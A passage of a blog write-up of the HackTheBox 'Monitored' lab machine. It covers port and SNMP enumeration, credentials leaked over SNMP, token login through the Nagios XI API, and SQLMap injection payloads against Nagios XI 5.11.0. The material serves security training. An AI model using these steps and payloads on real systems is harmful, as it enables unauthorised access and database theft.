<!doctype html><html lang=en><head><title>HTB Monitored WriteUp ¬∑ gunzf0x
</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=color-scheme content="light dark"><meta name=author content="gunzf0x"><meta name=description content="HackTheBox 'Monitored' WriteUp"><meta name=keywords content="blog,pentesting,hacking,personal"><meta name=twitter:card content="summary"><meta name=twitter:title content="HTB Monitored WriteUp"><meta name=twitter:description content="HackTheBox 'Monitored' WriteUp"><meta property="og:url" content="https://gunzf0x.github.io/pentesting/posts/monitored/"><meta property="og:site_name" content="gunzf0x"><meta property="og:title" content="HTB Monitored WriteUp"><meta property="og:description" content="HackTheBox 'Monitored' WriteUp"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-05-11T00:00:00+00:00"><meta property="article:modified_time" content="2024-05-11T00:00:00+00:00"><meta property="article:tag" content="HTB"><meta property="article:tag" content="Machine"><meta property="article:tag" content="Linux"><meta property="article:tag" content="Medium"><meta property="article:tag" content="Api"><meta property="article:tag" content="Linpeas"><link rel=canonical href=https://gunzf0x.github.io/pentesting/posts/monitored/><link rel=preload href=/fonts/fa-brands-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-regular-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-solid-900.woff2 as=font type=font/woff2 crossorigin><link rel=stylesheet href=/pentesting/css/coder.min.577e3c5ead537873430da16f0964b754a120fd87c4e2203a00686e7c75b51378.css integrity="sha256-V348Xq1TeHNDDaFvCWS3VKEg/YfE4iA6AGhufHW1E3g=" crossorigin=anonymous media=screen><link rel=stylesheet href=/pentesting/css/coder-dark.min.a00e6364bacbc8266ad1cc81230774a1397198f8cfb7bcba29b7d6fcb54ce57f.css integrity="sha256-oA5jZLrLyCZq0cyBIwd0oTlxmPjPt7y6KbfW/LVM5X8=" crossorigin=anonymous media=screen><link rel=icon type=image/png href=/pentesting/images/favicon-32x32.png sizes=any><link rel=icon type=image/png href=/pentesting/images/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/pentesting/images/favicon-16x16.png sizes=16x16><link rel=apple-touch-icon href=/pentesting/images/apple-touch-icon.png><link rel=apple-touch-icon sizes=180x180 href=/pentesting/images/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/pentesting/images/safari-pinned-tab.svg color=#5bbad5></head><body class="preload-transitions colorscheme-auto"><div class=float-container><a id=dark-mode-toggle class=colorscheme-toggle><i class="fa-solid fa-adjust fa-fw" aria-hidden=true></i></a></div><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=/pentesting>gunzf0x
</a><input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle><i class="fa-solid fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/pentesting/about/>whoami</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/posts/>Blog/WriteUps</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/projects/>Projects</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/contact/>Contact me</a></li><li class="navigation-item menu-separator"><span>|</span></li><li class=navigation-item><a href=/pentesting/es/posts/monitored/>üá®üá±</a></li></ul></section></nav><div class=content><section class="container post"><article><header><div class=post-title><h1 class=title><a class=title-link href=https://gunzf0x.github.io/pentesting/posts/monitored/>HTB Monitored WriteUp</a></h1></div><div class=post-meta><div class=date><span class=posted-on><i class="fa-solid fa-calendar" aria-hidden=true></i>
<time datetime=2024-05-11T00:00:00Z>11 May, 2024
</time></span><span class=reading-time><i class="fa-solid fa-clock" aria-hidden=true></i>
17-minute read</span></div><div class=tags><i class="fa-solid fa-tag" aria-hidden=true></i>
<span class=tag><a href=/pentesting/tags/htb/>HTB</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/machine/>Machine</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/linux/>Linux</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/medium/>Medium</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/api/>Api</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/linpeas/>Linpeas</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/nagios/>Nagios</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/cookies/>Cookies</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/netcat/>Netcat</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/sudo/>Sudo</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/udp/>Udp</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/snmp/>Snmp</a></span></div></div></header><div class=post-content><hr><h1 id=monitored----hackthebox>Monitored &ndash; HackTheBox
<a class=heading-link href=#monitored----hackthebox><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h1><ul><li>OS: <em>Linux</em></li><li>Difficulty: <em>Medium</em></li><li>Platform: <em>HackTheBox</em></li></ul><p><img alt="&lsquo;Monitored&rsquo; Avatar" src=/pentesting/images/Monitored_avatar.png></p><hr><h1 id=monitored-machine>&ldquo;Monitored&rdquo; Machine
<a class=heading-link href=#monitored-machine><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h1><h2 id=user>User
<a class=heading-link href=#user><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><ul><li>We start with a <code>Nmap</code> scan and find the following ports open: <code>22</code> <code>SSH</code>, <code>80</code> <code>HTTP</code>, <code>389</code> <code>Lightweight Directory Access Protocol</code> (<code>LDAP</code>), <code>443</code> <code>HTTPs</code> and <code>5667</code></li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sudo nmap -sVC -p22,80,389,443,5667 10.10.11.248 -oN targeted
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-10 19:00 -04
</span></span></span><span class=line><span class=cl><span class=go>Nmap scan report for 10.10.11.248
</span></span></span><span class=line><span class=cl><span class=go>Host is up (0.21s latency).
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>PORT     STATE SERVICE    VERSION
</span></span></span><span class=line><span class=cl><span class=go>22/tcp   open  ssh        OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
</span></span></span><span class=line><span class=cl><span class=go>| ssh-hostkey:
</span></span></span><span class=line><span class=cl><span class=go>|   3072 61:e2:e7:b4:1b:5d:46:dc:3b:2f:91:38:e6:6d:c5:ff (RSA)
</span></span></span><span class=line><span class=cl><span class=go>|   256 29:73:c5:a5:8d:aa:3f:60:a9:4a:a3:e5:9f:67:5c:93 (ECDSA)
</span></span></span><span class=line><span class=cl><span class=go>|_  256 6d:7a:f9:eb:8e:45:c2:02:6a:d5:8d:4d:b3:a3:37:6f (ED25519)
</span></span></span><span class=line><span class=cl><span class=go>80/tcp   open  http       Apache httpd 2.4.56
</span></span></span><span class=line><span class=cl><span class=go>|_http-title: Did not follow redirect to https://nagios.monitored.htb/
</span></span></span><span class=line><span class=cl><span class=go>|_http-server-header: Apache/2.4.56 (Debian)
</span></span></span><span class=line><span class=cl><span class=go>389/tcp  open  ldap       OpenLDAP 2.2.X - 2.3.X
</span></span></span><span class=line><span class=cl><span class=go>443/tcp  open  ssl/http   Apache httpd 2.4.56 ((Debian))
</span></span></span><span class=line><span class=cl><span class=go>|_http-server-header: Apache/2.4.56 (Debian)
</span></span></span><span class=line><span class=cl><span class=go>| ssl-cert: Subject: commonName=nagios.monitored.htb/organizationName=Monitored/stateOrProvinceName=Dorset/countryName=UK
</span></span></span><span class=line><span class=cl><span class=go>| Not valid before: 2023-11-11T21:46:55
</span></span></span><span class=line><span class=cl><span class=go>|_Not valid after:  2297-08-25T21:46:55
</span></span></span><span class=line><span class=cl><span class=go>|_http-title: Nagios XI
</span></span></span><span class=line><span class=cl><span class=go>|_ssl-date: TLS randomness does not represent time
</span></span></span><span class=line><span class=cl><span class=go>| tls-alpn:
</span></span></span><span class=line><span class=cl><span class=go>|_  http/1.1
</span></span></span><span class=line><span class=cl><span class=go>5667/tcp open  tcpwrapped
</span></span></span><span class=line><span class=cl><span class=go>Service Info: Host: nagios.monitored.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span></span><span class=line><span class=cl><span class=go>Nmap done: 1 IP address (1 host up) scanned in 27.86 seconds
</span></span></span></code></pre></div><ul><li>Looking at the scan we can see that port <code>80</code> <code>HTTP</code> service redirects to <code>nagios.monitored.htb</code>. So we add that domain to our <code>/etc/hosts</code> file running:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sudo echo &#39;10.10.11.248 monitored.htb nagios.monitored.htb&#39; &gt;&gt; /etc/hosts
</span></span></span></code></pre></div><p>where <code>10.10.11.248</code> is the victim&rsquo;s machine IP</p><ul><li>This machine also presents <code>User Datagram Protocol|UDP</code> ports open:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sudo nmap -sUV -p123,161 10.10.11.248 -oN targeted_UDP
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-10 19:47 -04
</span></span></span><span class=line><span class=cl><span class=go>Nmap scan report for monitored.htb (10.10.11.248)
</span></span></span><span class=line><span class=cl><span class=go>Host is up (0.16s latency).
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>PORT    STATE SERVICE VERSION
</span></span></span><span class=line><span class=cl><span class=go>123/udp open  ntp     NTP v4 (unsynchronized)
</span></span></span><span class=line><span class=cl><span class=go>161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
</span></span></span><span class=line><span class=cl><span class=go>Service Info: Host: monitored
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span></span><span class=line><span class=cl><span class=go>Nmap done: 1 IP address (1 host up) scanned in 1.24 seconds
</span></span></span></code></pre></div><p>with port <code>161</code> running <code>Simple Network Management Protocol</code> (<code>SNMP</code>) service.</p><ul><li>Visiting <code>https://nagios.monitored.htb</code> we can see a webpage:</li></ul><p><img alt="Monitored 1" src=/pentesting/images/Monitored_1.png></p><p>The server is apparently running <code>Nagios XI</code>, a software used for monitoring activities.</p><blockquote><p><code>Nagios XI</code> is an extended interface of <code>Nagios Core</code>, intended as the enterprise-level version of the monitoring tool</p></blockquote><ul><li>Clicking on <code>Access Nagios XI</code> in this page shows a login page:</li></ul><p><img alt="Monitored 2" src=/pentesting/images/Monitored_2.png></p><ul><li>Searching on internet the default credentials for <code>Nagios XI</code> are <code>root:nagiosxi</code>. But they don&rsquo;t work. Other default credentials such as <code>admin:admin</code> or <code>guest:guest</code> don&rsquo;t work either.</li><li>At this point, since we don&rsquo;t have any valid credentials, I will try to perform a <code>Brute Force Directory Listing</code> using <code>Gobuster</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u https://nagios.monitored.htb/nagiosxi/ -x php -t 55 -k
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>Gobuster v3.6
</span></span></span><span class=line><span class=cl><span class=go>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>[+] Url:                     https://nagios.monitored.htb/nagiosxi/
</span></span></span><span class=line><span class=cl><span class=go>[+] Method:                  GET
</span></span></span><span class=line><span class=cl><span class=go>[+] Threads:                 55
</span></span></span><span class=line><span class=cl><span class=go>[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
</span></span></span><span class=line><span class=cl><span class=go>[+] Negative Status codes:   404
</span></span></span><span class=line><span class=cl><span class=go>[+] User Agent:              gobuster/3.6
</span></span></span><span class=line><span class=cl><span class=go>[+] Extensions:              php
</span></span></span><span class=line><span class=cl><span class=go>[+] Timeout:                 10s
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>Starting gobuster in directory enumeration mode
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>/index.php            (Status: 302) [Size: 27] [--&gt; https://nagios.monitored.htb/nagiosxi/login.php?redirect=/nagiosxi/index.php%3f&amp;noauth=1]
</span></span></span><span class=line><span class=cl><span class=go>/images               (Status: 301) [Size: 340] [--&gt; https://nagios.monitored.htb/nagiosxi/images/]
</span></span></span><span class=line><span class=cl><span class=go>/about                (Status: 301) [Size: 339] [--&gt; https://nagios.monitored.htb/nagiosxi/about/]
</span></span></span><span class=line><span class=cl><span class=go>/.php                 (Status: 403) [Size: 286]
</span></span></span><span class=line><span class=cl><span class=go>/login.php            (Status: 200) [Size: 26575]
</span></span></span><span class=line><span class=cl><span class=go>/help                 (Status: 301) [Size: 338] [--&gt; https://nagios.monitored.htb/nagiosxi/help/]
</span></span></span><span class=line><span class=cl><span class=go>/tools                (Status: 301) [Size: 339] [--&gt; https://nagios.monitored.htb/nagiosxi/tools/]
</span></span></span><span class=line><span class=cl><span class=go>/mobile               (Status: 301) [Size: 340] [--&gt; https://nagios.monitored.htb/nagiosxi/mobile/]
</span></span></span><span class=line><span class=cl><span class=go>/admin                (Status: 301) [Size: 339] [--&gt; https://nagios.monitored.htb/nagiosxi/admin/]
</span></span></span><span class=line><span class=cl><span class=go>/reports              (Status: 301) [Size: 341] [--&gt; https://nagios.monitored.htb/nagiosxi/reports/]
</span></span></span><span class=line><span class=cl><span class=go>/account              (Status: 301) [Size: 341] [--&gt; https://nagios.monitored.htb/nagiosxi/account/]
</span></span></span><span class=line><span class=cl><span class=go>/includes             (Status: 301) [Size: 342] [--&gt; https://nagios.monitored.htb/nagiosxi/includes/]
</span></span></span><span class=line><span class=cl><span class=go>/install.php          (Status: 302) [Size: 0] [--&gt; https://nagios.monitored.htb/nagiosxi/]
</span></span></span><span class=line><span class=cl><span class=go>/backend              (Status: 301) [Size: 341] [--&gt; https://nagios.monitored.htb/nagiosxi/backend/]
</span></span></span><span class=line><span class=cl><span class=go>/db                   (Status: 301) [Size: 336] [--&gt; https://nagios.monitored.htb/nagiosxi/db/]
</span></span></span><span class=line><span class=cl><span class=go>/api                  (Status: 301) [Size: 337] [--&gt; https://nagios.monitored.htb/nagiosxi/api/]
</span></span></span><span class=line><span class=cl><span class=go>/upgrade.php          (Status: 302) [Size: 0] [--&gt; index.php]
</span></span></span><span class=line><span class=cl><span class=go>/config               (Status: 301) [Size: 340] [--&gt; https://nagios.monitored.htb/nagiosxi/config/]
</span></span></span><span class=line><span class=cl><span class=go>/suggest.php          (Status: 200) [Size: 27]
</span></span></span><span class=line><span class=cl><span class=go>/views                (Status: 301) [Size: 339] [--&gt; https://nagios.monitored.htb/nagiosxi/views/]
</span></span></span><span class=line><span class=cl><span class=go>/sounds               (Status: 403) [Size: 286]
</span></span></span><span class=line><span class=cl><span class=go>/rr.php               (Status: 302) [Size: 0] [--&gt; login.php]
</span></span></span><span class=line><span class=cl><span class=go>/terminal             (Status: 200) [Size: 5215]
</span></span></span><span class=line><span class=cl><span class=go>/.php                 (Status: 403) [Size: 286]
</span></span></span><span class=line><span class=cl><span class=go>Progress: 441120 / 441122 (100.00%)
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>Finished
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span></code></pre></div><ul><li>Visiting <code>https://nagios.monitored.htb/nagiosxi/terminal/</code> shows kind of a terminal that asks for a user and a password:</li></ul><p><img alt="Monitored 3" src=/pentesting/images/Monitored_3.png></p><p>so nothing interesting here at the moment</p><ul><li>Back to <code>User Datagram Protocol|UDP</code> ports, if we check <code>SNMP</code> messages with <code>snmpwalk</code> we can see the following:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ snmpwalk -v 2c -c public 10.10.11.248
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>iso.3.6.1.2.1.1.1.0 = STRING: &#34;Linux monitored 5.10.0-28-amd64 #1 SMP Debian 5.10.209-2 (2024-01-31) x86_64&#34;
</span></span></span><span class=line><span class=cl><span class=go>iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
</span></span></span><span class=line><span class=cl><span class=go>iso.3.6.1.2.1.1.3.0 = Timeticks: (434466) 1:12:24.66
</span></span></span><span class=line><span class=cl><span class=go>iso.3.6.1.2.1.1.4.0 = STRING: &#34;Me &lt;root@monitored.htb&gt;&#34;
</span></span></span><span class=line><span class=cl><span class=go>iso.3.6.1.2.1.1.5.0 = STRING: &#34;monitored&#34;
</span></span></span><span class=line><span class=cl><span class=go>iso.3.6.1.2.1.1.6.0 = STRING: &#34;Sitting on the Dock of the Bay&#34;
</span></span></span><span class=line><span class=cl><span class=go>iso.3.6.1.2.1.1.7.0 = INTEGER: 72
</span></span></span><span class=line><span class=cl><span class=go>iso.3.6.1.2.1.1.8.0 = Timeticks: (1581) 0:00:15.81
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span></code></pre></div><p>but this takes too much time. We can do it faster using <code>snmpbulkwalk</code> and storing all the output into a file called <code>snmpbulk-output.txt</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ snmpbulkwalk -Cr1000 -c public -v2c 10.10.11.248 &gt; snmpbulk-output.txt
</span></span></span></code></pre></div><ul><li>If I check the created file with <code>cat</code> I can eventually see something interesting:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ cat snmpbulk-output.txt
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>iso.3.6.1.2.1.1.1.0 = STRING: &#34;Linux monitored 5.10.0-28-amd64 #1 SMP Debian 5.10.209-2 (2024-01-31) x86_64&#34;
</span></span></span><span class=line><span class=cl><span class=go>iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
</span></span></span><span class=line><span class=cl><span class=go>iso.3.6.1.2.1.1.3.0 = Timeticks: (451621) 1:15:16.21
</span></span></span><span class=line><span class=cl><span class=go>iso.3.6.1.2.1.1.4.0 = STRING: &#34;Me &lt;root@monitored.htb&gt;&#34;
</span></span></span><span class=line><span class=cl><span class=go>iso.3.6.1.2.1.1.5.0 = STRING: &#34;monitored&#34;
</span></span></span><span class=line><span class=cl><span class=go>iso.3.6.1.2.1.1.6.0 = STRING: &#34;Sitting on the Dock of the Bay&#34;
</span></span></span><span class=line><span class=cl><span class=go>iso.3.6.1.2.1.1.7.0 = INTEGER: 72
</span></span></span><span class=line><span class=cl><span class=go>iso.3.6.1.2.1.1.8.0 = Timeticks: (1581) 0:00:15.81
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go>iso.3.6.1.2.1.25.4.2.1.5.1379 = STRING: &#34;-d /usr/local/nagios/etc/nagios.cfg&#34;
</span></span></span><span class=line><span class=cl><span class=go>iso.3.6.1.2.1.25.4.2.1.5.1420 = STRING: &#34;-u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB&#34;
</span></span></span><span class=line><span class=cl><span class=go>iso.3.6.1.2.1.25.4.2.1.5.1421 = STRING: &#34;-c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB&#34;
</span></span></span><span class=line><span class=cl><span class=go>iso.3.6.1.2.1.25.4.2.1.5.1433 = STRING: &#34;-bd -q30m&#34;
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span></code></pre></div><p>where we have a user and a password: <code>svc:XjH7VCehowpR1xZB</code></p><ul><li>Using this user and password at <code>https://nagios.monitored.htb/nagiosxi/login.php</code> does not work:</li></ul><p><img alt="Monitored 4" src=/pentesting/images/Monitored_4.png></p><p>I note that the displayed message is different from that shown when we provide invalid credentials:</p><p><img alt="Monitored 5" src=/pentesting/images/Monitored_5.png></p><p>so I assume that the user <code>svc</code> exists.</p><ul><li>Back to directories found with <code>Gobuster</code> the directory <code>/api</code>, and after applying a lot of brute forcing, leads to the direction <code>https://nagios.monitored.htb/nagiosxi/api/v1/authenticate/</code>:</li></ul><p><img alt="Monitored 6" src=/pentesting/images/Monitored_6.png></p><p>and using <code>cURL</code> with <code>POST</code> method I get:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ curl -s -X POST &#39;https://nagios.monitored.htb/nagiosxi/api/v1/authenticate&#39; --insecure
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>{&#34;error&#34;:&#34;Must be valid username and password.&#34;}
</span></span></span></code></pre></div><ul><li>So, apparently, the site is asking for a <code>username</code> and <code>password</code> fields. We can try to post the data we have previously found using <code>cURL</code> as well:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ curl -s -X POST &#39;https://nagios.monitored.htb/nagiosxi/api/v1/authenticate&#39; --insecure -d &#39;username=svc&amp;password=XjH7VCehowpR1xZB&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>{&#34;username&#34;:&#34;svc&#34;,&#34;user_id&#34;:&#34;2&#34;,&#34;auth_token&#34;:&#34;eebd2c4f308f2ec54f93a4392e75a5a5d952bf50&#34;,&#34;valid_min&#34;:5,&#34;valid_until&#34;:&#34;Fri, 10 May 2024 20:42:26 -0400&#34;}
</span></span></span></code></pre></div><ul><li>Checking <code>Nagios XI</code> <a href=https://www.nagios.org/ncpa/help/2.0/api.html class=external-link target=_blank rel=noopener>documentation</a> we can see that to interact with tokens we can visit:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>https://localhost:5693/api?token=mytoken
</span></span></code></pre></div><ul><li>After playing with the parameters, visiting the following page works:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ curl -s --insecure &#39;https://nagios.monitored.htb/nagiosxi/login.php?token=eebd2c4f308f2ec54f93a4392e75a5a5d952bf50&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>        &lt;!DOCTYPE html&gt;
</span></span></span><span class=line><span class=cl><span class=go>        &lt;!-- &lt;!DOCTYPE html&gt; --&gt;
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span></code></pre></div><p>and visiting the victim server webpage <code>https://nagios.monitored.htb/nagiosxi/login.php?token=eebd2c4f308f2ec54f93a4392e75a5a5d952bf50</code> from <code>Firefox</code> browser shows a login panel:</p><p><img alt="Monitored 7" src=/pentesting/images/Monitored_7.png></p><ul><li>Now we are logged in we search for vulnerabilities for <code>Nagios XI</code>, more specifically we are using version <code>5.11.0</code>. We find <a href=https://outpost24.com/blog/nagios-xi-vulnerabilities/ class=external-link target=_blank rel=noopener>this post</a> that indicates a potential <code>SQL Injection</code> based on the route:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>/nagiosxi/admin/banner_message-ajaxhelper.php
</span></span></code></pre></div><p>based on the parameter <code>id</code> (point 3 from the post) with action <code>update_banner_message_settings</code>.</p><ul><li>We use <code>SQLMap</code> against this route. First, I get the <code>nagiosxi</code> cookie going to my <code>Firefox</code> browser, then <code>Inspect > Storage</code> and get the cookie. In my case I got <code>dkkthk9urkl17li0bsrn5r2t96</code>. And now pass all the data to <code>SQLMap</code> prompt:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sqlmap -u &#39;https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&amp;id=3&#39; -p &#39;id&#39; --cookie=&#39;nagiosxi=dkkthk9urkl17li0bsrn5r2t96&#39; --batch
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go>GET parameter &#39;id&#39; is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
</span></span></span><span class=line><span class=cl><span class=go>sqlmap identified the following injection point(s) with a total of 261 HTTP(s) requests:
</span></span></span><span class=line><span class=cl><span class=go>---
</span></span></span><span class=line><span class=cl><span class=go>Parameter: id (GET)
</span></span></span><span class=line><span class=cl><span class=go>    Type: boolean-based blind
</span></span></span><span class=line><span class=cl><span class=go>    Title: Boolean-based blind - Parameter replace (original value)
</span></span></span><span class=line><span class=cl><span class=go>    Payload: action=acknowledge_banner_message&amp;id=(SELECT (CASE WHEN (4806=4806) THEN 3 ELSE (SELECT 7441 UNION SELECT 9346) END))
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>    Type: error-based
</span></span></span><span class=line><span class=cl><span class=go>    Title: MySQL &gt;= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
</span></span></span><span class=line><span class=cl><span class=go>    Payload: action=acknowledge_banner_message&amp;id=3 OR (SELECT 2606 FROM(SELECT COUNT(*),CONCAT(0x7176766b71,(SELECT (ELT(2606=2606,1))),0x716b706271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>    Type: time-based blind
</span></span></span><span class=line><span class=cl><span class=go>    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
</span></span></span><span class=line><span class=cl><span class=go>    Payload: action=acknowledge_banner_message&amp;id=3 AND (SELECT 7051 FROM (SELECT(SLEEP(5)))xZsL)
</span></span></span><span class=line><span class=cl><span class=go>---
</span></span></span><span class=line><span class=cl><span class=go>[21:54:21] [INFO] the back-end DBMS is MySQL
</span></span></span><span class=line><span class=cl><span class=go>web server operating system: Linux Debian
</span></span></span><span class=line><span class=cl><span class=go>web application technology: Apache 2.4.56
</span></span></span><span class=line><span class=cl><span class=go>back-end DBMS: MySQL &gt;= 5.0 (MariaDB fork)
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span></code></pre></div><ul><li>Next, check the databases adding <code>--dbs</code> flag:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sqlmap -u &#39;https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&amp;id=3&#39; -p &#39;id&#39; --cookie=&#39;nagiosxi=dkkthk9urkl17li0bsrn5r2t96&#39; --batch --dbs
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go>available databases [2]:
</span></span></span><span class=line><span class=cl><span class=go>[*] information_schema
</span></span></span><span class=line><span class=cl><span class=go>[*] nagiosxi
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span></code></pre></div><ul><li>Extract the tables from <code>nagiosxi</code> database:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sqlmap -u &#39;https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&amp;id=3&#39; -p &#39;id&#39; --cookie=&#39;nagiosxi=dkkthk9urkl17li0bsrn5r2t96&#39; --batch -D nagiosxi --tables
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
